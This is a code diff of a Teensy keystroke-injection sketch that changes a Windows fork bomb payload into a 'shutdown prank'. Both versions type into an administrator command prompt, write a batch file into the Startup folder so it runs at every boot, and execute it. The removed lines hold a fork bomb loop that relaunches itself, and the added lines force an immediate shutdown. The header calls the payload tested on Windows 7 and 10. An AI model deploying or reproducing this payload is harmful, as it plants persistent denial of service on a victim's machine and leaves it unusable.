@@ -2,19 +2,19 @@
 
 Teensy ( https://www.pjrc.com/teensy/ )
 
-Payload: windows-forkbomb
+Payload: windows-shutdown-prank
 
 Disclaimer: Use at own risk, the functions used in this program will render your machine virtually useless.
 
-Description: Opens a command prompt as administrator with run, uses con copy to create fork bomb batch.
+Description: Opens a command prompt as administrator with run, uses con copy to create shutdown/restart/logoff batch.
 
 Then save as .bat file under the startup folder and runs every startup.
 
-You can optionally choose to avoid executing the fork bomb after writing the batch file.
+You can optionally choose to avoid executing the batch file after writing.
 
 Using US Keyboard Layout. Modify delays depending on the target machine. Tested Windows 7 and Windows 10.
 
-Concept: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---fork-bomb, https://forums.hak5.org/index.php?/topic/39367-mr-robot-hack-optimized-payload/&do=findComment&comment=282928
+Concept: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---restart-prank
 
 Created by Kleo Bercero - @kbeflo - kbeflo@gmail.com
 
@@ -72,20 +72,15 @@ void setup() {
   Keyboard.set_key1(0);
   Keyboard.send_now();
   delay(500);
-  // Write fork bomb batch file
-  Keyboard.print("copy con 6rgl4ljf4m.bat");
+  // Write shutdown batch
+  Keyboard.print("copy con ctx4dpui7l.bat");
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
   Keyboard.print("@echo off");
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
-  Keyboard.print(":START");
-  Keyboard.set_key1(KEY_ENTER);
-  Keyboard.send_now();
-  Keyboard.print("start \"%UserProfile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\6rgl4ljf4m.bat\"");
-  Keyboard.set_key1(KEY_ENTER);
-  Keyboard.send_now();
-  Keyboard.print("GOTO START");
+  // Usage /s to shutdown, /r to restart and /l to logoff the user. For delay /t x, valid range is 0-315360000 (10 years) default is 30.
+  Keyboard.print("shutdown /s /t 0");
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
   Keyboard.set_modifier(0);
@@ -106,8 +101,8 @@ void setup() {
   Keyboard.set_key1(0);
   Keyboard.send_now();
   delay(500);
-  // Optional: Comment block to avoid executing fork bomb, making it dormant until the next and every startup.
-  Keyboard.print("6rgl4ljf4m.bat");
+  // Optional: Comment block to avoid executing batch, making it dormant until the next and every startup.
+  Keyboard.print("ctx4dpui7l.bat");
   Keyboard.set_key1(KEY_ENTER);
   Keyboard.send_now();
   Keyboard.set_modifier(0);
